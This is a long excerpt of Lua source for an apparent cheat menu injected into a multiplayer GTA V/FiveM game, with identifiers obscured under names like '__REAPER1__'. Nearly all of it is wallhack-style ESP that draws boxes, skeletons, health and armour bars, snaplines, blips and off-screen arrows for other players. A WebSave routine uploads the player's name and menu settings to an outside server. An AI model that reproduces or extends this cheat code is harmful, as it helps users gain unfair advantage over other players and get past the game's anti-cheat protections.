            if __REAPER1__.A['visuals:textesp_information'].extra[3] then
                name = name .. ' HP: ' .. __REAPER1__.N.GetEntityHealth(v)
            end
            if __REAPER1__.A['visuals:textesp_information'].extra[7] then
                name = name .. ' | ' .. __REAPER1__.F.FloatLength(__REAPER1__.N.GetEntitySpeed(v) * 3.6, 0) .. ' km/h'
            end
        end

        local coords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(v, __REAPER1__.A['visuals:textesp_offset'].extra.x, __REAPER1__.A['visuals:textesp_offset'].extra.y, __REAPER1__.A['visuals:textesp_offset'].extra.z)
        local ret, sx, sy = __REAPER1__.N.GetScreenCoordFromWorldCoord(coords.x, coords.y, coords.z)
        __REAPER1__.F.DrawText(name, sx, sy, __REAPER1__.A['visuals:textesp_font'].sindex - 1, r, g, b, a, __REAPER1__.A['visuals:textesp_scale'].sindex / 100, __REAPER1__.A['visuals:textesp_center'].func, __REAPER1__.A['visuals:textesp_shadow'].func, __REAPER1__.A['visuals:textesp_outline'].func)
    end

    __REAPER1__.F.Glowing = function(coords)
        local r, g, b = __REAPER1__.F.Color('visuals:glow_colortype', 'visuals:glow_color')
        __REAPER1__.N.Glow(coords.x, coords.y, coords.z + 9.15, 0.0, 0.0, -1000.0, r, g, b, 10.1, __REAPER1__.F.IntToFloat(__REAPER1__.A['visuals:glow_strength'].sindex - 1), 0.0, 2.5, 0.0)
    end

    __REAPER1__.F.BoxEsp = function(v, c, sx, sy, w, y, w2, y2)
        local r, g, b, a = __REAPER1__.F.Color('visuals:boxesp_colortype', 'visuals:boxesp_color', 220)
        if __REAPER1__.A['visuals:boxesp_secondarycolor'].toggle and (__REAPER1__.A['visuals:boxesp_secondarycolor'].sindex == 1 and not __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, v, 17) or __REAPER1__.A['visuals:boxesp_secondarycolor'].sindex == 2 and __REAPER1__.F.TlistCheck(v)) then
            r, g, b, a = __REAPER1__.F.Color('visuals:boxesp_ocolortype', 'visuals:boxesp_ocolor', 220)
        end

        local width = (w + w2) / 2
        local height = (y + y2) / 2

        local width2 = width / 2
        local height2 = height / 2

        if w - 0.2 <= sx and w2 - 0.2 <= sx then
            local sw = (__REAPER1__.A['visuals:boxesp_thickness'].sindex / 30 / __REAPER1__.M.ScreenResox)
            local sh = (__REAPER1__.A['visuals:boxesp_thickness'].sindex / 30 / __REAPER1__.M.ScreenResoy)

            if __REAPER1__.A['visuals:boxesp_length'].sindex == 100 then
                __REAPER1__.N.DrawRect(sx - width2, sy, sw, height, r, g, b, a)
                __REAPER1__.N.DrawRect(sx + width2, sy, sw, height, r, g, b, a)
                __REAPER1__.N.DrawRect(sx, sy - height2, width, sh, r, g, b, a)
                __REAPER1__.N.DrawRect(sx, sy + height2, width, sh, r, g, b, a)
            else
                local hght = height2 / 100 * __REAPER1__.A['visuals:boxesp_length'].sindex
                local sy2, sy3 = sy + height2 / 2, sy - height2 / 2
                local dh = (height2 - hght) / 2
                __REAPER1__.N.DrawRect(sx - width2, sy2 + dh, sw, hght, r, g, b, a)
                __REAPER1__.N.DrawRect(sx - width2, sy3 - dh, sw, hght, r, g, b, a)
                __REAPER1__.N.DrawRect(sx + width2, sy2 + dh, sw, hght, r, g, b, a)
                __REAPER1__.N.DrawRect(sx + width2, sy3 - dh, sw, hght, r, g, b, a)
        
                local wdth = width2 / 100 * __REAPER1__.A['visuals:boxesp_length'].sindex
                local sx2, sx3 = sx + width2 / 2, sx - width2/ 2
                local dw = (width2 - wdth) / 2
                __REAPER1__.N.DrawRect(sx2 + dw, sy - height2, wdth, sh, r, g, b, a)
                __REAPER1__.N.DrawRect(sx3 - dw, sy - height2, wdth, sh, r, g, b, a)
                __REAPER1__.N.DrawRect(sx2 + dw, sy + height2, wdth, sh, r, g, b, a)
                __REAPER1__.N.DrawRect(sx3 - dw, sy + height2, wdth, sh, r, g, b, a)
            end
        end
    end

    __REAPER1__.F.BoxEspFill = function(v, c, sx, sy, w, y, w2, y2)
        local r, g, b, a = __REAPER1__.F.Color('visuals:boxesp_fcolortype', 'visuals:boxesp_fcolor', 80)
        if __REAPER1__.A['visuals:boxesp_fsecondarycolor'].toggle and (__REAPER1__.A['visuals:boxesp_fsecondarycolor'].sindex == 1 and not __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, v, 17) or __REAPER1__.A['visuals:boxesp_fsecondarycolor'].sindex == 2 and __REAPER1__.F.TlistCheck(v)) then
            r, g, b, a = __REAPER1__.F.Color('visuals:boxesp_focolortype', 'visuals:boxesp_focolor', 80)
        end

        if w - 0.2 <= sx and w2 - 0.2 <= sx then
            __REAPER1__.N.DrawRect(sx, sy, (w + w2) / 2, (y + y2) / 2, r, g, b, a)
        end
    end

    __REAPER1__.F.HealthBarEsp = function(v, c, sx, sy, w, y, w2, y2)
        local width = (w + w2) / 2
        local height = (y + y2) / 2

        if w - 0.2 <= sx and w2 - 0.2 <= sx then
            local maxhp = __REAPER1__.N.GetEntityMaxHealth(v) - 100
            local hp = __REAPER1__.N.GetEntityHealth(v) - 100 < 0 and 0 or __REAPER1__.N.GetEntityHealth(v) - 100
    
            local r, g, b, a = __REAPER1__.F.BarColor('visuals:baresp_colortype', 'visuals:baresp_color', 255, hp, maxhp)
            if __REAPER1__.A['visuals:baresp_secondarycolor'].toggle and (__REAPER1__.A['visuals:baresp_secondarycolor'].sindex == 1 and not __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, v, 17) or __REAPER1__.A['visuals:baresp_secondarycolor'].sindex == 2 and __REAPER1__.F.TlistCheck(v)) then
                r, g, b = __REAPER1__.F.BarColor('visuals:baresp_ocolortype', 'visuals:baresp_ocolor', 255, hp, maxhp)
            end

            local sw = (__REAPER1__.A['visuals:baresp_thickness'].sindex / 30 / __REAPER1__.M.ScreenResox)
            local sh = (__REAPER1__.A['visuals:baresp_thickness'].sindex / 30 / __REAPER1__.M.ScreenResoy)

            if __REAPER1__.A['visuals:baresp_position'].sindex == 1 then
                sx = sx - (7.0 / __REAPER1__.M.ScreenResox)
                local hght = height / maxhp * hp
            
                if __REAPER1__.A['visuals:baresp_background'].sindex == 2 then
                    __REAPER1__.N.DrawRect(sx - width / 2, sy, sw, height, 0, 0, 0, a - 30)
                elseif __REAPER1__.A['visuals:baresp_background'].sindex == 3 then
                    __REAPER1__.N.DrawRect(sx - width / 2, sy, sw + (sw * 2), height + (sh * 2), 0, 0, 0, a - 30)
                end
            
                __REAPER1__.N.DrawRect(sx - width / 2, sy + (height - hght) / 2, sw, hght, r, g, b, a - 30)
            
                if __REAPER1__.A['visuals:baresp_text'].func and (hp > 0 and hp < maxhp) then
                    __REAPER1__.F.DrawText(hp, sx - width / 2, sy + (height - hght) / 2 - hght / 2 - 5.0 / __REAPER1__.M.ScreenResoy, 4, 255, 255, 255, a, 0.2, true, false, true)
                end
            elseif __REAPER1__.A['visuals:baresp_position'].sindex == 2 then
                sx = sx + (7.0 / __REAPER1__.M.ScreenResox)
                local hght = height / maxhp * hp
            
                if __REAPER1__.A['visuals:baresp_background'].sindex == 2 then
                    __REAPER1__.N.DrawRect(sx + width / 2, sy, sw, height, 0, 0, 0,  a - 30)
                elseif __REAPER1__.A['visuals:baresp_background'].sindex == 3 then
                    __REAPER1__.N.DrawRect(sx + width / 2, sy, sw + (sw * 2), height + (sh * 2), 0, 0, 0, a - 30)
                end
            
                __REAPER1__.N.DrawRect(sx + width / 2, sy + (height - hght) / 2, sw, hght, r, g, b, a - 30)
            
                if __REAPER1__.A['visuals:baresp_text'].func and (hp > 0 and hp < maxhp) then
                    __REAPER1__.F.DrawText(hp, sx + width / 2, sy + (height - hght) / 2 - hght / 2 - 5.0 / __REAPER1__.M.ScreenResoy, 4, 255, 255, 255, a, 0.2, true, false, true)
                end
            elseif __REAPER1__.A['visuals:baresp_position'].sindex == 3 then
                sy = sy - (7.0 / __REAPER1__.M.ScreenResoy)
                local wdth = width / maxhp * hp
            
                if __REAPER1__.A['visuals:baresp_background'].sindex == 2 then
                    __REAPER1__.N.DrawRect(sx, sy - height / 2, width, sh, 0, 0, 0, a - 30)
                elseif __REAPER1__.A['visuals:baresp_background'].sindex == 3 then
                    __REAPER1__.N.DrawRect(sx, sy - height / 2, width + (sw * 2), sh + (sh * 2), 0, 0, 0, a - 30)
                end
            
                __REAPER1__.N.DrawRect(sx - (width - wdth) / 2, sy - height / 2, wdth, sh, r, g, b, a - 30)
            
                if __REAPER1__.A['visuals:baresp_text'].func and (hp > 0 and hp < maxhp) then
                    __REAPER1__.F.DrawText(hp, sx - (width - wdth) / 2 + wdth / 2 - 3.0 / __REAPER1__.M.ScreenResox, sy - height / 2 - 15.0 / __REAPER1__.M.ScreenResox, 4, 255, 255, 255, a, 0.2, true, false, true)
                end
            elseif __REAPER1__.A['visuals:baresp_position'].sindex == 4 then
                sy = sy + (7.0 / __REAPER1__.M.ScreenResoy)
                local wdth = width / maxhp * hp
            
                if __REAPER1__.A['visuals:baresp_background'].sindex == 2 then
                    __REAPER1__.N.DrawRect(sx, sy + height / 2, width, sh, 0, 0, 0, a - 30)
                elseif __REAPER1__.A['visuals:baresp_background'].sindex == 3 then
                    __REAPER1__.N.DrawRect(sx, sy + height / 2, width + (sw * 2), sh + (sh * 2), 0, 0, 0, a - 30)
                end
            
                __REAPER1__.N.DrawRect(sx - (width - wdth) / 2, sy + height / 2, wdth, sh, r, g, b, a - 30)
            
                if __REAPER1__.A['visuals:baresp_text'].func and (hp > 0 and hp < maxhp) then
                    __REAPER1__.F.DrawText(hp, sx - (width - wdth) / 2 + wdth / 2 - 3.0 / __REAPER1__.M.ScreenResox, sy + height / 2 - 15.0 / __REAPER1__.M.ScreenResox, 4, 255, 255, 255, a, 0.2, true, false, true)
                end
            end
        end
    end

    __REAPER1__.F.ArmourBarEsp = function(v, c, sx, sy, w, y, w2, y2)
        local width = (w + w2) / 2
        local height = (y + y2) / 2

        if w - 0.2 <= sx and w2 - 0.2 <= sx then
            local maxhp = 100
            local hp = __REAPER1__.N.GetPedArmour(v)
        
            local r, g, b, a = __REAPER1__.F.Color('visuals:baresp_fcolortype', 'visuals:baresp_fcolor')
            if __REAPER1__.A['visuals:baresp_fsecondarycolor'].toggle and (__REAPER1__.A['visuals:baresp_fsecondarycolor'].sindex == 1 and not __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, v, 17) or __REAPER1__.A['visuals:baresp_fsecondarycolor'].sindex == 2 and __REAPER1__.F.TlistCheck(v)) then
                r, g, b = __REAPER1__.F.Color('visuals:baresp_focolortype', 'visuals:baresp_focolor')
            end
        
            local sw = (__REAPER1__.A['visuals:baresp_fthickness'].sindex / 30 / __REAPER1__.M.ScreenResox)
            local sh = (__REAPER1__.A['visuals:baresp_fthickness'].sindex / 30 / __REAPER1__.M.ScreenResoy)

            local pos = __REAPER1__.A['visuals:baresp_baresp'].func and __REAPER1__.A['visuals:baresp_position'].sindex == __REAPER1__.A['visuals:baresp_fposition'].sindex and 12.0 or 7.0
        
            if __REAPER1__.A['visuals:baresp_fposition'].sindex == 1 then
                sx = sx - (pos / __REAPER1__.M.ScreenResox)
                local hght = height / maxhp * hp
            
                if __REAPER1__.A['visuals:baresp_fbackground'].sindex == 2 then
                    __REAPER1__.N.DrawRect(sx - width / 2, sy, sw, height, 0, 0, 0, a - 30)
                elseif __REAPER1__.A['visuals:baresp_fbackground'].sindex == 3 then
                    __REAPER1__.N.DrawRect(sx - width / 2, sy, sw + (sw * 2), height + (sh * 2), 0, 0, 0, a - 30)
                end
            
                __REAPER1__.N.DrawRect(sx - width / 2, sy + (height - hght) / 2, sw, hght, r, g, b, a - 30)
            
                if __REAPER1__.A['visuals:baresp_ftext'].func and (hp > 0 and hp < maxhp) then
                    __REAPER1__.F.DrawText(hp, sx - width / 2, sy + (height - hght) / 2 - hght / 2 - 5.0 / __REAPER1__.M.ScreenResoy, 4, 255, 255, 255, a, 0.2, true, false, true)
                end
            elseif __REAPER1__.A['visuals:baresp_fposition'].sindex == 2 then
                sx = sx + (pos / __REAPER1__.M.ScreenResox)
                local hght = height / maxhp * hp
            
                if __REAPER1__.A['visuals:baresp_fbackground'].sindex == 2 then
                    __REAPER1__.N.DrawRect(sx + width / 2, sy, sw, height, 0, 0, 0,  a - 30)
                elseif __REAPER1__.A['visuals:baresp_fbackground'].sindex == 3 then
                    __REAPER1__.N.DrawRect(sx + width / 2, sy, sw + (sw * 2), height + (sh * 2), 0, 0, 0, a - 30)
                end
            
                __REAPER1__.N.DrawRect(sx + width / 2, sy + (height - hght) / 2, sw, hght, r, g, b, a - 30)
            
                if __REAPER1__.A['visuals:baresp_ftext'].func and (hp > 0 and hp < maxhp) then
                    __REAPER1__.F.DrawText(hp, sx + width / 2, sy + (height - hght) / 2 - hght / 2 - 5.0 / __REAPER1__.M.ScreenResoy, 4, 255, 255, 255, a, 0.2, true, false, true)
                end
            elseif __REAPER1__.A['visuals:baresp_fposition'].sindex == 3 then
                sy = sy - (pos / __REAPER1__.M.ScreenResoy)
                local wdth = width / maxhp * hp
            
                if __REAPER1__.A['visuals:baresp_fbackground'].sindex == 2 then
                    __REAPER1__.N.DrawRect(sx, sy - height / 2, width, sh, 0, 0, 0, a - 30)
                elseif __REAPER1__.A['visuals:baresp_fbackground'].sindex == 3 then
                    __REAPER1__.N.DrawRect(sx, sy - height / 2, width + (sw * 2), sh + (sh * 2), 0, 0, 0, a - 30)
                end
            
                __REAPER1__.N.DrawRect(sx - (width - wdth) / 2, sy - height / 2, wdth, sh, r, g, b, a - 30)
            
                if __REAPER1__.A['visuals:baresp_ftext'].func and (hp > 0 and hp < maxhp) then
                    __REAPER1__.F.DrawText(hp, sx - (width - wdth) / 2 + wdth / 2 - 3.0 / __REAPER1__.M.ScreenResox, sy - height / 2 - 15.0 / __REAPER1__.M.ScreenResox, 4, 255, 255, 255, a, 0.2, true, false, true)
                end
            elseif __REAPER1__.A['visuals:baresp_fposition'].sindex == 4 then
                sy = sy + (pos / __REAPER1__.M.ScreenResoy)
                local wdth = width / maxhp * hp
            
                if __REAPER1__.A['visuals:baresp_fbackground'].sindex == 2 then
                    __REAPER1__.N.DrawRect(sx, sy + height / 2, width, sh, 0, 0, 0, a - 30)
                elseif __REAPER1__.A['visuals:baresp_fbackground'].sindex == 3 then
                    __REAPER1__.N.DrawRect(sx, sy + height / 2, width + (sw * 2), sh + (sh * 2), 0, 0, 0, a - 30)
                end
            
                __REAPER1__.N.DrawRect(sx - (width - wdth) / 2, sy + height / 2, wdth, sh, r, g, b, a - 30)
            
                if __REAPER1__.A['visuals:baresp_ftext'].func and (hp > 0 and hp < maxhp) then
                    __REAPER1__.F.DrawText(hp, sx - (width - wdth) / 2 + wdth / 2 - 3.0 / __REAPER1__.M.ScreenResox, sy + height / 2 - 15.0 / __REAPER1__.M.ScreenResox, 4, 255, 255, 255, a, 0.2, true, false, true)
                end
            end
        end
    end

    __REAPER1__.F.LineEsp = function(v, c, c2)
        local r, g, b, a = __REAPER1__.F.Color('visuals:lineesp_colortype', 'visuals:lineesp_color', 230)
        if __REAPER1__.A['visuals:lineesp_secondarycolor'].toggle and (__REAPER1__.A['visuals:lineesp_secondarycolor'].sindex == 1 and not __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, v, 17) or __REAPER1__.A['visuals:lineesp_secondarycolor'].sindex == 2 and __REAPER1__.F.TlistCheck(v)) then
            r, g, b, a = __REAPER1__.F.Color('visuals:lineesp_ocolortype', 'visuals:lineesp_ocolor', 230)
        end

        local c = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.SelfPed, __REAPER1__.A['visuals:lineesp_offset'].extra.x, __REAPER1__.A['visuals:lineesp_offset'].extra.y, __REAPER1__.A['visuals:lineesp_offset'].extra.z)
        __REAPER1__.N.DrawLine(c.x, c.y, c.z, c2.x, c2.y, c2.z, r, g, b, a)
    end

    __REAPER1__.F.MarkerEsp = function(v, c)
        local r, g, b, a = __REAPER1__.F.Color('visuals:markers_colortype', 'visuals:markers_color', 200)
        local scale = __REAPER1__.F.IntToFloat(__REAPER1__.A['visuals:markers_scale'].sindex) / 50

        local c = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(v, __REAPER1__.A['visuals:markers_offset'].extra.x, __REAPER1__.A['visuals:markers_offset'].extra.y, __REAPER1__.A['visuals:markers_offset'].extra.z)
        __REAPER1__.N.DrawMarker(__REAPER1__.A['visuals:markers_type'].sindex - 1, c.x, c.y, c.z, __REAPER1__.A['visuals:markers_direction'].extra.x, __REAPER1__.A['visuals:markers_direction'].extra.y, __REAPER1__.A['visuals:markers_direction'].extra.z, __REAPER1__.A['visuals:markers_rotation'].extra.x, __REAPER1__.A['visuals:markers_rotation'].extra.y, __REAPER1__.A['visuals:markers_rotation'].extra.z, scale, scale, scale, r, g, b, a,
        __REAPER1__.A['visuals:markers_move'].func, __REAPER1__.A['visuals:markers_facecamera'].func, 2, __REAPER1__.A['visuals:markers_rotate'].func, false, false, __REAPER1__.A['visuals:markers_drawonentity'].func)
    end

    __REAPER1__.F.BlipEsp = function(v, c)
        local blip = __REAPER1__.N.AddBlipForCoord(c)
        __REAPER1__.N.SetBlipSprite(blip, __REAPER1__.A['visuals:blips_type'].sindex - 1)
        __REAPER1__.N.SetBlipScale(blip, __REAPER1__.F.IntToFloat(__REAPER1__.A['visuals:blips_scale'].sindex)/10)
        __REAPER1__.N.SetBlipColour(blip, __REAPER1__.A['visuals:blips_color'].sindex - 1)
        __REAPER1__.N.SetBlipAlpha(blip, __REAPER1__.A['visuals:blips_alpha'].sindex - 1)
        __REAPER1__.N.SetBlipFlashes(blip, __REAPER1__.A['visuals:blips_flash'].func)
        __REAPER1__.T.VisBlips[v] = blip
    end

    __REAPER1__.F.SkeletonEsp = function(v)
        local r, g, b, a = __REAPER1__.F.Color('visuals:skeletonesp_colortype', 'visuals:skeletonesp_color')
        if __REAPER1__.A['visuals:skeletonesp_secondarycolor'].toggle and (__REAPER1__.A['visuals:skeletonesp_secondarycolor'].sindex == 1 and not __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, v, 17) or __REAPER1__.A['visuals:skeletonesp_secondarycolor'].sindex == 2 and __REAPER1__.F.TlistCheck(v)) then
            r, g, b, a = __REAPER1__.F.Color('visuals:skeletonesp_ocolortype', 'visuals:skeletonesp_ocolor')
        end
        
        local mindistance = __REAPER1__.M.GetMinVisualDistance(__REAPER1__.N.GetPedBoneCoords(v, 0x0, 0.0, 0.0, 0.0))

        local rightknee = __REAPER1__.M.GetCoordInNoodleSoup(__REAPER1__.N.GetPedBoneCoords(v, 0x3FCF, 0.0, 0.0, 0.0), mindistance)
        local leftknee = __REAPER1__.M.GetCoordInNoodleSoup(__REAPER1__.N.GetPedBoneCoords(v, 0xB3FE, 0.0, 0.0, 0.0), mindistance)
        local neck = __REAPER1__.M.GetCoordInNoodleSoup(__REAPER1__.N.GetPedBoneCoords(v, 0x9995, 0.0, 0.0, 0.0), mindistance)
        local head = __REAPER1__.M.GetCoordInNoodleSoup(__REAPER1__.N.GetPedBoneCoords(v, 0x796E, 0.0, 0.0, 0.0), mindistance)
        local pelvis = __REAPER1__.M.GetCoordInNoodleSoup(__REAPER1__.N.GetPedBoneCoords(v, 0x2E28, 0.0, 0.0, 0.0), mindistance)
        local rightFoot = __REAPER1__.M.GetCoordInNoodleSoup(__REAPER1__.N.GetPedBoneCoords(v, 0xCC4D, 0.0, 0.0, 0.0), mindistance)
        local leftFoot = __REAPER1__.M.GetCoordInNoodleSoup(__REAPER1__.N.GetPedBoneCoords(v, 0x3779, 0.0, 0.0, 0.0), mindistance)
        local rightUpperArm = __REAPER1__.M.GetCoordInNoodleSoup(__REAPER1__.N.GetPedBoneCoords(v, 0x9D4D, 0.0, 0.0, 0.0), mindistance)
        local leftUpperArm = __REAPER1__.M.GetCoordInNoodleSoup(__REAPER1__.N.GetPedBoneCoords(v, 0xB1C5, 0.0, 0.0, 0.0), mindistance)
        local rightForeArm = __REAPER1__.M.GetCoordInNoodleSoup(__REAPER1__.N.GetPedBoneCoords(v, 0x6E5C, 0.0, 0.0, 0.0), mindistance)
        local leftForeArm = __REAPER1__.M.GetCoordInNoodleSoup(__REAPER1__.N.GetPedBoneCoords(v, 0xEEEB, 0.0, 0.0, 0.0), mindistance)
        local rightHand = __REAPER1__.M.GetCoordInNoodleSoup(__REAPER1__.N.GetPedBoneCoords(v, 0xDEAD, 0.0, 0.0, 0.0), mindistance)
        local leftHand = __REAPER1__.M.GetCoordInNoodleSoup(__REAPER1__.N.GetPedBoneCoords(v, 0x49D9, 0.0, 0.0, 0.0), mindistance)

        --[[head -> neck]]
        __REAPER1__.N.DrawLine(head, neck, r, g, b, a)
        --[[neck -> pelvis]]
        __REAPER1__.N.DrawLine(neck, pelvis, r, g, b, a)
        --[[pelvis -> knees]]
        __REAPER1__.N.DrawLine(pelvis, rightknee, r, g, b, a)
        __REAPER1__.N.DrawLine(pelvis, leftknee, r, g, b, a)
        --[[knees -> feet]]
        __REAPER1__.N.DrawLine(rightknee, rightFoot, r, g, b, a)
        __REAPER1__.N.DrawLine(leftknee, leftFoot, r, g, b, a)
        --[[neck -> upper arms]]
        __REAPER1__.N.DrawLine(neck, rightUpperArm, r, g, b, a)
        __REAPER1__.N.DrawLine(neck, leftUpperArm, r, g, b, a)
        --[[upper arms -> forearms]]
        __REAPER1__.N.DrawLine(rightUpperArm, rightForeArm, r, g, b, a)
        __REAPER1__.N.DrawLine(leftUpperArm, leftForeArm, r, g, b, a)
        --[[forearms -> hands]]
        __REAPER1__.N.DrawLine(rightForeArm, rightHand, r, g, b, a)
        __REAPER1__.N.DrawLine(leftForeArm, leftHand, r, g, b, a)
    end

    __REAPER1__.F.FovArrows = function(entC, camC, occl)
        local r, g, b, a = __REAPER1__.F.Color('visuals:fovarrow_colortype', 'visuals:fovarrow_color')
        if __REAPER1__.A['visuals:fovarrow_secondarycolor'].toggle and (__REAPER1__.A['visuals:fovarrow_secondarycolor'].sindex == 1 and (type(occl) == 'bool' and occl == false or not __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, occl, 17)) or __REAPER1__.A['visuals:fovarrow_secondarycolor'].sindex == 2 and __REAPER1__.F.TlistCheck(v)) then
            r, g, b, a = __REAPER1__.F.Color('visuals:fovarrow_ocolortype', 'visuals:fovarrow_ocolor')
        end

        local fov = __REAPER1__.A['visuals:fovarrow_size'].sindex
        local r2, f = __REAPER1__.M.RotToQuat(__REAPER1__.N.GetFinalRenderedCamRot(0)) * vector3(1,0,0), __REAPER1__.M.RotToQuat(__REAPER1__.N.GetFinalRenderedCamRot(0)) * vector3(0,1,0)
        local u = entC - camC
        local dist = #u
        dist = dist < 1 and 1 or dist > 100 and 100 or dist

        if __REAPER1__.A['visuals:fovarrow_dynamic'].func then fov = 30 + (dist * (600 - 30)/100) end
        if __REAPER1__.A['visuals:fovarrow_dynamicalpha'].func then a = math.ceil((255 / (dist / 20))) end

        local angle2 = math.deg(math.acos(((u.x * f.x + u.y * f.y) / (math.sqrt(u.x * u.x + u.y * u.y) * math.sqrt(f.x * f.x + f.y * f.y)))))
        local isInfront = angle2 > 90 and 0 or 1

        local angle = math.deg(math.acos(((u.x * r2.x + u.y * r2.y) / (math.sqrt(u.x * u.x + u.y * u.y) * math.sqrt(r2.x * r2.x + r2.y * r2.y)))))
        angle = isInfront == 1 and 360 - angle or angle

        local x, y = (math.cos(math.rad(angle)) / __REAPER1__.M.ScreenResox) * (fov) + 0.5, (math.sin(math.rad(angle)) / __REAPER1__.M.ScreenResoy) * (fov) + 0.5
        local sprite, size = __REAPER1__.A['visuals:fovarrow_type'].extra[__REAPER1__.A['visuals:fovarrow_type'].sindex], __REAPER1__.A['visuals:fovarrow_asize'].sindex / 5
        __REAPER1__.N.DrawSprite(sprite.dict, sprite.name, x, y, 0.0025 * size, 0.004 * size, angle - sprite.min, r, g, b, a, true)
    end

    __REAPER1__.F.RandomCoords = function()
        local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
        local x, y = coords.x + math.random(-700, 700), coords.y + math.random(-700, 700)
        local ground, z = __REAPER1__.N.GetGroundZFor_3dCoord(x, y, coords.z + 1000, 0)
        if ground then
            return x, y, z
        else
            return false
        end
    end

    __REAPER1__.F.RemoveEmoji = function(name)
        local newname = ""
        for i = 1, #name do
            if string.byte(string.sub(name,i,i)) < 158 then
                newname = newname .. string.sub(name,i,i)
            end
        end
        return #newname > 0 and newname or name
    end

    __REAPER1__.F.WebSave = function(name, enc, size, notif, hname)
        local cfg = json.encode(enc)
        local s, e, c = 1, size, 0
        for i = 1, #cfg, size - 1 do
            local _, er = pcall(function()
                if i == 1 then
                    Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..(hname or Ham.getName())..[[&append=]]..[[&cfg=]]..name..[[&val=]]..string.sub(cfg,s,e), 'host19.phl.hu', 443, true)
                else
                    s,e = s + size, e + size
                    Ham.GETRequest([[https://host19.phl.hu/mentes3.php?usr=]]..(hname or Ham.getName())..[[&cfg=]]..name..[[&val=&append=]]..string.sub(cfg,s,e), 'host19.phl.hu', 443, true)
                end
            end)

            if notif then __REAPER1__.F.AddNotification('Saved section '.. i .. ' out of ' .. #cfg, 1000, 200, 200, 200) end
            __REAPER26__(0)
        end
    end
    
    __REAPER1__.F.DeleteConfigTab = function(dkey, cfgname, num)
        if __REAPER1__.M.CurrentMenu == cfgname then
            __REAPER1__.F.SetMenu(cfgname, dkey)
        end

        if #__REAPER1__.T.Display[dkey] == num then
            table.remove(__REAPER1__.T.Display[dkey], num)
            table.remove(__REAPER1__.T.Display[dkey], num - 1)
        else
            for k,v in ipairs(__REAPER1__.T.Display[dkey]) do
                if v.dkey == cfgname then
                    table.remove(__REAPER1__.T.Display[dkey], k)
                    break
                end
            end
        end
    end

    __REAPER1__.F.GenConfigName = function(cfg)
        return "bnnjodas21g861g8ze61eg126eg71268e1g6728jkndas" .. __REAPER1__.N.GetPlayerName(__REAPER1__.V.SelfPlayerId) .. "_" .. cfg
    end

    __REAPER1__.F.EnableIpl = function(ipl, bool)
        if type(ipl) == 'table' then
            for k,v in pairs(ipl) do
                __REAPER1__.F.EnableIpl(v, bool)
            end
        elseif bool and not __REAPER1__.N.IsIplActive(v) then
            __REAPER1__.N.RequestIpl(ipl)
        elseif __REAPER1__.N.IsIplActive(v) then
            __REAPER1__.N.RemoveIpl(ipl)
        end
    end

    __REAPER1__.F.SetIplPropState = function(interiorId, props, state, refresh)
        if type(interiorId) == 'table' then
            for k,v in pairs(interiorId) do
                __REAPER1__.F.SetIplPropState(v, props, state, refresh)
            end
        elseif type(props) == 'table' then
            for k,v in pairs(props) do
                __REAPER1__.F.SetIplPropState(interiorId, v, state, refresh)
            end
        elseif state and not __REAPER1__.F.IsInteriorEntitySetActive(interiorId, props) then
            __REAPER1__.F.ActivateInteriorEntitySet(interiorId, props)
        elseif __REAPER1__.F.IsInteriorEntitySetActive(interiorId, props) then
            __REAPER1__.F.DeactivateInteriorEntitySet(interiorId, props) 
        end

        if refresh then
            __REAPER1__.F.RefreshInterior(interiorId)
        end
    end

    __REAPER1__.M.GetMinVisualDistance = function(pos)
        local cam = __REAPER1__.N.GetFinalRenderedCamCoord()
        local hray, hit, coords, surfaceNormal, ent = __REAPER1__.N.GetShapeTestResult(__REAPER1__.N.StartShapeTestRay(cam.x, cam.y, cam.z, pos.x, pos.y, pos.z, -1, __REAPER1__.V.SelfPed, 0))
        if hit then
            return #(cam - coords) / #(cam - pos) * 0.83
        end
    end
    
    __REAPER1__.M.GetCoordInNoodleSoup = function(vec, factor)
        local c = __REAPER1__.N.GetFinalRenderedCamCoord()
        factor = (not factor or factor >= 1) and 1 / 1.2 or factor
        return vector3(c.x + (vec.x - c.x) * factor, c.y + (vec.y - c.y) * factor, c.z + (vec.z - c.z) * factor)
    end

    __REAPER1__.M.RotationToDirection = function(rotation)
        local adjustedRotation = vector3((math.pi / 180) * rotation.x, (math.pi / 180) * rotation.y, (math.pi / 180) * rotation.z)
        return vector3(-math.sin(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.cos(adjustedRotation.z) * math.abs(math.cos(adjustedRotation.x)), math.sin(adjustedRotation.x))
    end

    __REAPER1__.M.RotToQuat = function(rot)
        local pitch = math.rad(rot.x)
        local roll  = math.rad(rot.y)
        local yaw   = math.rad(rot.z)

        local cy = math.cos(yaw   * 0.5)
        local sy = math.sin(yaw   * 0.5)
        local cr = math.cos(roll  * 0.5)
        local sr = math.sin(roll  * 0.5)
        local cp = math.cos(pitch * 0.5)
        local sp = math.sin(pitch * 0.5)

        return quat(
            cy * cr * cp + sy * sr * sp,
            cy * sp * cr - sy * cp * sr,
            cy * cp * sr + sy * sp * cr,
            sy * cr * cp - cy * sr * sp
        )
    end

    __REAPER1__.M.GetTargetRot = function(v)
        return vector3(math.deg(math.atan2(v.z, #vector2(v.x, v.y))), 0.0, -math.deg(math.atan2(v.x, v.y)))
    end

    __REAPER1__.M.RayCastGameplayCamera = function(distance)
        if __REAPER1__.A['misc:freecam_freecam'].func then
            return __REAPER1__.V.FreecamC, __REAPER1__.V.FreecamE
        else
            local cameraCoord = __REAPER1__.N.GetGameplayCamCoord()
            local direction = __REAPER1__.M.RotationToDirection(__REAPER1__.N.GetGameplayCamRot(0))
            local dx, dy, dz = cameraCoord.x + direction.x * distance, cameraCoord.y + direction.y * distance, cameraCoord.z + direction.z * distance
